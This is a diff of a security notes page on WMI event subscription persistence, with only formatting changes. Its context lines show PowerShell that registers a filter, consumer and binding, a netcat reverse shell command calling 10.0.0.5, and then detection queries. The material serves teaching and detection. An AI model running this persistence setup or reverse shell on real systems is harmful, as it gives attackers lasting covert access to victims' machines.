@@ -16,8 +16,7 @@ WMI Events can be used by both offenders \(persistence, i.e launch payload when 
 
 Creating `WMI __EVENTFILTER`, `WMI __EVENTCONSUMER` and `WMI __FILTERTOCONSUMERBINDING`:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 # WMI __EVENTFILTER
 $wmiParams = @{
@@ -51,18 +50,15 @@ $wmiParams.Arguments = @{
 
 $bindingResult = Set-WmiInstance @wmiParams
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Note that the `ExecutablePath` property of the `__EVENTCONSUMER` points to a rudimentary netcat reverse shell:
 
-{% tabs %}
-{% tab title="c:\\shell.cmd" %}
+{% code title="c:\\shell.cmd" %}
 ```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## Observations
 
@@ -72,13 +68,11 @@ Note the process ancestry of the shell - as usual, wmi/winrm spawns processes fr
 
 On the victim/suspected host, we can see all the regsitered WMI event filters, event consumers and their bindings and inspect them for any malicious intents with these commands:
 
-{% tabs %}
-{% tab title="\_\_EventFilter@victim" %}
+{% code title="\_\_EventFilter@victim" %}
 ```csharp
 Get-WmiObject -Class __EventFilter -Namespace root\subscription
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Note the `Query` property suggests this wmi filter is checking system's uptime every 5 seconds and is checking if the system has been up for at least 1200 seconds:
 
@@ -86,23 +80,19 @@ Note the `Query` property suggests this wmi filter is checking system's uptime e
 
 Event consumer, suggesting that the `shell.cmd` will be executed upon invokation as specified in the property `ExecutablePath`:
 
-{% tabs %}
-{% tab title="\_\_EventConsumer@victim" %}
+{% code title="\_\_EventConsumer@victim" %}
 ```csharp
 Get-WmiObject -Class __EventConsumer -Namespace root\subscription
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../../.gitbook/assets/wmi-consumer.png)
 
-{% tabs %}
-{% tab title="\_\_FilterToConsumerBinding@victim" %}
+{% code title="\_\_FilterToConsumerBinding@victim" %}
 ```csharp
 Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\subscription
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../../.gitbook/assets/wmi-binding.png)
 
